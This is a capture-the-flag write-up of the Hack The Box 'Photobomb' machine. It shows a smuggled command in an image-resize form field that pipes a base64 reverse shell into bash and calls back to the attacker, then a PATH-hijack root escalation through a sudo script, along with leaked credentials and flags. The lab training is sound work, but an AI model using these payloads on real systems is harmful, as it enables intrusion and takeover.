+++
title = "Photobomb"
date = "2023-02-09"
description = "This is an easy Linux box."
[extra]
cover = "cover.png"
toc = true
+++

# Information

**Difficulty**: Easy

**OS**: Linux

**Release date**: 2022-10-08

**Created by**: [slartibartfast](https://app.hackthebox.com/users/85231)

# Setup

I'll attack this box from a Kali Linux VM as the `root` user — not a great
practice security-wise, but it's a VM so it's alright. This way I won't have to
prefix some commands with `sudo`, which gets cumbersome in the long run.

I like to maintain consistency in my workflow for every box, so before starting
with the actual pentest, I'll prepare a few things:

1. I'll create a directory that will contain every file related to this box.
   I'll call it `workspace`, and it will be located at the root of my filesystem
   `/`.

1. I'll create a `server` directory in `/workspace`. Then, I'll use
   `httpsimpleserver` to create an HTTP server on port `80` and
   `impacket-smbserver` to create an SMB share named `server`. This will make
   files in this folder available over the Internet, which will be especially
   useful for transferring files to the target machine if need be!

1. I'll place all my tools and binaries into the `/workspace/server` directory.
   This will come in handy once we get a foothold, for privilege escalation and
   for pivoting inside the internal network.

I'll also strive to minimize the use of Metasploit, because it hides the
complexity of some exploits, and prefer a more manual approach when it's not too
much hassle. This way, I'll have a better understanding of the exploits I'm
running, and I'll have more control over what's happening on the machine.

Throughout this write-up, my machine's IP address will be `10.10.14.10`. The
commands ran on my machine will be prefixed with `❯` for clarity, and if I ever
need to transfer files or binaries to the target machine, I'll always place them
in the `/tmp` or `C:\tmp` folder to clean up more easily later on.

Now we should be ready to go!

# Host `10.10.11.182`

## Scanning

### Ports

As usual, let's start by initiating a port scan on Photobomb using a TCP SYN
`nmap` scan to assess its attack surface.

```sh
❯ nmap -sS "10.10.11.182" -p-
```

```
<SNIP>
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
<SNIP>
```

Let's also check the 500 most common UDP ports.

```sh
❯ nmap -sU "10.10.11.182" --top-ports "500"
```

```
<SNIP>
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
<SNIP>
```

### Fingerprinting

Following the ports scans, let's gather more data about the services associated
with the open TCP ports we found.

```sh
❯ nmap -sS "10.10.11.182" -p "22,80" -sV
```

```
<SNIP>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<SNIP>
```

Let's do the same for the UDP port.

```sh
❯ nmap -sU "10.10.11.182" -p "68" -sV
```

```
<SNIP>
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc
<SNIP>
```

Alright, so `nmap` managed to determine that Photobomb is running Linux, and the
version of SSH suggests that it might be Ubuntu.

### Scripts

Let's run `nmap`'s default scripts on the TCP services to see if they can find
additional information.

```sh
❯ nmap -sS "10.10.11.182" -p "22,80" -sC
```

```
<SNIP>
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://photobomb.htb/
<SNIP>
```

Let's also run them on the UDP service.

```sh
❯ nmap -sU "10.10.11.182" -p "68" -sC
```

```
<SNIP>
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
<SNIP>
```

The `http-title` script indicates that the Nginx server redirects to
`http://photobomb.htb/`. I'll add it to my `/etc/hosts` file.

```sh
❯ echo "10.10.11.182 photobomb.htb" >> /etc/hosts
```

## Services enumeration

### Nginx

#### Exploration

Let's browse to `http://photobomb.htb/`.

![Domain homepage](domain-homepage.png)

It's a website promoting Photobomb. It's unclear what it's really about, it
states 'You will soon be making an amazing income selling premium photographic
gifts' and gives us a link to `/printer`, presumably to access our printer.

#### Fingerprinting

Let's fingerprint the technologies used by this website with the
[Wappalyzer](https://www.wappalyzer.com/) extension.

![Domain homepage Wappalyzer extension](domain-homepage-wappalyzer.png)

#### Exploration

If we browse to `http://photobomb.htb/printer`, we're asked to authenticate
using HTTP authentication. The homepage indicates that the credentials are in
our welcome pack, but since we don't have it, we'll have to find them.

If we check this login request's response using Burp Suite, we see that it uses
the 'Basic' scheme with a realm set to 'Admin Area'. It might suggest that
`admin` is a valid username.

Let's use `hydra` to try finding valid credentials using
[this wordlist](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)
for the usernames and
[this wordlist](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-passwords-shortlist.txt)
for the passwords.

```sh
❯ hydra -L "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/wordlists/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt" "photobomb.htb" "http-get" "/printer"
```

```
<SNIP>
1 of 1 target completed, 0 valid password found
<SNIP>
```

It failed.

If we enter an invalid URL, we also get a custom web page.

![Domain 404 page](domain-404-page.png)

It indicates that this website is using Sinatra. What's this?

> Sinatra is a DSL for quickly creating web applications in Ruby with minimal
> effort.
>
> — [GitHub](https://github.com/sinatra/sinatra)

#### Source code review

If we check the source code of the web page, we find a link to `/photobomb.js`:

```js
function init() {
    // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
    if (
        document.cookie.match(
            /^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/,
        )
    ) {
        document
            .getElementsByClassName("creds")[0]
            .setAttribute("href", "http://pH0t0:b0Mb!@photobomb.htb/printer");
    }
}
window.onload = init;
```

It checks if the request to the homepage contains a `isPhotoBombTechSupport`
cookie. If it does, it changes the link to `/printer` by prepopulating it with
the `pH0t0`:`b0Mb!` credentials.

According to the comment of this script, it's meant to help tech support as they
keep forgetting the credentials, but this will be of tremendous help for us.

#### Exploration

Let's browse once again to `/printer`, and let's authenticate with the
credentials we just found.

![Domain printer page](domain-printer-page.png)

We are served a web page containing several images. We can select one of them,
as well as a file type between PNG and JPG and an image dimension. Then, we can
send the form to download the image we selected in the specified dimension and
format.

#### Under the hood

If we check the previous requests using Burp Suite, we notice that when we press
the 'Download photo to print' button to submit the form, a POST message is sent
to `/printer` with the data:

```html
photo=<IMAGE_LINK>&filetype=<FILETYPE>&dimensions=<WIDTH>x<HEIGHT>
```

I replayed this request on Burp Suite to study the behavior of the website.

If I send an invalid `photo` parameter, the response is
`Source photo does not exist.`. However, I can freely edit the `filetype` and
`dimensions` parameters, as long as `filetype` is prefixed with `png` or `jpg`,
and `dimensions` are valid.

If we add `.txt` after the `filetype` value, the response is like this:

```
# ImageMagick pixel enumeration: 300,200,65535,srgb
0,0: (1545,1204,990)  #060504  srgb(6,5,4)
1,0: (1529,1056,1417)  #060406  srgb(6,4,6)
2,0: (1646,1162,1980)  #060508  srgb(6,5,8)
3,0: (1493,1021,1723)  #060407  srgb(6,4,7)
<SNIP>
```

Therefore, we can infer that it's using ImageMagick to convert and resize the
image we select.

#### Path traversal

I tried to enter `../../../../../../etc/passwd` after the `photo` parameter, but
the response is `Invalid photo.`. It looks like there's some sort of validation
for the filetype, so unfortunately we can't read any file on the filesystem.

#### OS command injection

Since ImageMagick is used to convert and to resize the image we select, the
website is likely using a Bash command with the values we enter. This means that
we may be able to execute our own commands by adding them as a POST parameter
value.

I already tried to modify the `photo` parameter, but it's validated so we can't
execute our own commands.

The same goes for the `dimensions` parameter.

However, the `filetype` parameter is considered valid as long as it starts with
`jpg` or `png. If we add a command after a valid prefix, the result is
`Failed to generate a copy of voicu-apostol-MWER49YaD-M-unsplash.jpg`, so it
likely worked!

If we send an extra request with `sleep 10` as the command, there's a 10 seconds
delay before we receive the response, so our OS command injection definitely
worked!

## Foothold (RCE)

Since the website uses ImageMagick to dynamically convert and resize the image
based on user-controllable inputs, and it fails to properly sanitize the
`filetype` parameter, we can fiddle with this parameter to obtain RCE.

### Preparation

The goal is to obtain a reverse shell.

First, I'll setup a listener to receive the shell.

```sh
❯ rlwrap nc -lvnp "9001"
```

Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
[RevShells](https://www.revshells.com/) configured to obtain a `/bin/bash`
shell.

I'll save it as the `BASE64_REVSHELL_PAYLOAD` shell variable.

### Exploitation

Let's send a request to Photobomb to execute our payload.

```sh
❯ curl -s -o "/dev/null" -H "Authorization: Basic cEgwdDA6YjBNYiE=" "http://photobomb.htb/printer" -X "POST" --data-urlencode "photo=voicu-apostol-MWER49YaD-M-unsplash.jpg" --data-urlencode "filetype=jpg; /bin/echo $BASE64_REVSHELL_PAYLOAD | /usr/bin/base64 -d | /bin/bash -i" --data-urlencode "dimensions=3000x2000"
```

If we check our listener:

```
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.182] 48052
<SNIP>
wizard@photobomb:~/photobomb$
```

It caught the reverse shell!

### Stabilizing the shell

Our home folder doesn't contain a `.ssh` folder, so I'll create one. Then I'll
create a private key and I'll add the corresponding key to `authorized_keys`.
Finally I'll connect over SSH to Photobomb. This way, I'll have a much more
stable shell.

## Getting a lay of the land

If we run `whoami`, we see that we got a foothold as `wizard`.

### Architecture

What is Photobomb's architecture?

```sh
wizard@photobomb:~$ uname -m
```

```
x86_64
```

It's using x86_64. Let's keep that in mind to select the appropriate binaries.

### Distribution

Let's see which distribution Photobomb is using.

```sh
wizard@photobomb:~$ cat "/etc/lsb-release"
```

```
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.5 LTS"
```

Okay, so it's Ubuntu 20.04.

### Kernel

Let's find the kernel version of Photobomb.

```sh
wizard@photobomb:~$ uname -r
```

```
5.4.0-126-generic
```

It's `5.4.0`.

### Users

Let's enumerate all users.

```sh
wizard@photobomb:~$ grep ".*sh$" "/etc/passwd" | cut -d ":" -f "1" | sort
```

```
root
wizard
```

There's `root` and `wizard` (us).

### Groups

Let's enumerate all groups.

```sh
wizard@photobomb:~$ cat "/etc/group" | cut -d ":" -f "1" | sort
```

```
adm
audio
backup
bin
cdrom
crontab
daemon
dialout
dip
disk
fax
floppy
games
gnats
input
irc
kmem
kvm
landscape
list
lp
lxd
mail
man
messagebus
netdev
news
nogroup
operator
plugdev
proxy
render
root
sasl
shadow
src
ssh
staff
sudo
sys
syslog
systemd-coredump
systemd-journal
systemd-network
systemd-resolve
systemd-timesync
tape
tcpdump
tss
tty
users
utmp
uucp
uuidd
video
voice
wizard
www-data
```

The `lxd` group is interesting to elevate privileges.

### NICs

Let's gather the list of connected NICs.

```sh
wizard@photobomb:~$ ifconfig
```

```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.182  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 fe80::250:56ff:feb9:e0ba  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:e0ba  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:e0:ba  txqueuelen 1000  (Ethernet)
        RX packets 1108  bytes 93214 (93.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1000  bytes 1188345 (1.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1239  bytes 1204083 (1.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1239  bytes 1204083 (1.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

There's an Ethernet interface and the loopback interface.

### Hostname

What is Photobomb's hostname?

```sh
wizard@photobomb:~$ hostname
```

```
photobomb
```

Yeah I know, very surprising.

## System enumeration

### Flags

If we check our home folder, we find the user flag.

```sh
wizard@photobomb:~$ cat "/home/wizard/user.txt"
```

```
4fd9520545063d1acb5806ffd300defc
```

### Website code review

Let's review the content of the Nginx website, located at `/home/wizard/photobomb`.

```
pH0t0:$apr1$dnyF00ZD$9PifZwUxL/J0BCS/wTShU1
```

The `.htpasswd` file contains HTTP credentials for the website. It corresponds
to the `pH0t0` username, so the hash must correspond to `b0Mb!`.

```sh
#!/bin/sh

cd $(dirname $(readlink -f "$0"))
ruby server.rb >>log/photobomb.log 2>&1
```

The `photobomb.sh` file executes the `server.rb` file using `ruby`, and we can
assume that it's used to start the server.

```rb
<SNIP>
post '/printer' do
  photo = params[:photo]
  filetype = params[:filetype]
  dimensions = params[:dimensions]

  # handle inputs
  if photo.match(/\.{2}|\//)
    halt 500, 'Invalid photo.'
  end

  if !FileTest.exist?( "source_images/" + photo )
    halt 500, 'Source photo does not exist.'
  end

  if !filetype.match(/^(png|jpg)/)
    halt 500, 'Invalid filetype.'
  end

  if !dimensions.match(/^[0-9]+x[0-9]+$/)
    halt 500, 'Invalid dimensions.'
  end

  case filetype
  when 'png'
    content_type 'image/png'
  when 'jpg'
    content_type 'image/jpeg'
  end

  filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
  response['Content-Disposition'] = "attachment; filename=#{filename}"

  if !File.exists?('resized_images/' + filename)
    command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
    puts "Executing: #{command}"
    system(command)
  else
    puts "File already exists."
  end

  if File.exists?('resized_images/' + filename)
    halt 200, {}, IO.read('resized_images/' + filename)
  end

  #message = 'Failed to generate a copy of ' + photo + ' resized to ' + dimensions + ' with filetype ' + filetype
  message = 'Failed to generate a copy of ' + photo
  halt 500, message
end
```

The `server.rb` file is responsible for handling requests related to resizing
and downloading images using Sinatra. It performs a few validation on the
inputs, and it uses the `convert` utility to actually convert and resize the
image.

### Sudo permissions

Let's see if we can execute anything as another user with `sudo`.

```sh
wizard@photobomb:~$ sudo -l
```

```
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

We do! We can execute the `/opt/cleanup.sh` binary as `root` while setting up
custom environment variables.

### Inspecting `/opt/cleanup.sh`

Let's see what the `cleanup.sh` file contains:

```sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

It's a Bash script that sources the `/opt/.bashrc` file, and then that cleans up
log files. It also changes the owner of the source images to `root`.

If we check the sourced `.bashrc` file, we see that it's mostly a standard Bash
configuration file. It does contain some weird lines, which are in fact
exploitable to get `root`, but I'll ignore them.

Unfortunately, we can't edit neither of these files. But the script calls the
`find` command without specifying its absolute path, so we should be able to
perform a path hijacking attack!

## Privilege escalation (Sudo permissions)

### Preparation

The goal is to obtain a reverse shell.

First, I'll setup a listener to receive the shell.

```sh
❯ rlwrap nc -lvnp "9002"
```

Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
[RevShells](https://www.revshells.com/) configured to obtain a `/bin/bash`
shell.

### Exploitation

I'll create a `find` script in `/tmp` to execute this command:

```sh
#!/bin/bash

/bin/echo <BASE64_REVSHELL_PAYLOAD> | /usr/bin/base64 -d | /bin/bash -i
```

Then, let's make it executable.

Finally, let's abuse our `sudo` permissions to execute the `/opt/cleanup.sh`
file as `root`, while specifying a custom `PATH` environment variable:

```sh
wizard@photobomb:~$ sudo "PATH=/tmp:$PATH" "/opt/cleanup.sh"
```

If we check our listener:

```
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.182] 38224
root@photobomb:/home/wizard/photobomb#
```

It caught the reverse shell!

### Stabilizing the shell

Our home folder contains a `.ssh` directory. There's no existing private key, so
I'll create one and add the corresponding public key to `authorized_keys`, and
then I'll connect over SSH to Photobomb. This way, I'll have a much more stable
shell.

## System enumeration

If we run `whoami`, we see that we're `root`!

### Flags

As usual, we can find the root flag in our home folder.

```sh
root@photobomb:~# cat "/root/root.txt"
```

```
a3c22d3079b454f8607db6a294c0e4c4
```

# Afterwords

![Success](success.png)

That's it for this box! 🎉

I rated both the user and root flags as 'Easy' to obtain. It was kinda easy to
find credentials for the `/printer` web page and the OS command injection
afterwards, and really straightforward to exploit to get a foothold. The
privilege escalation was also really easy, since it was a classic path hijacking
vulnerability.

Thanks for reading!
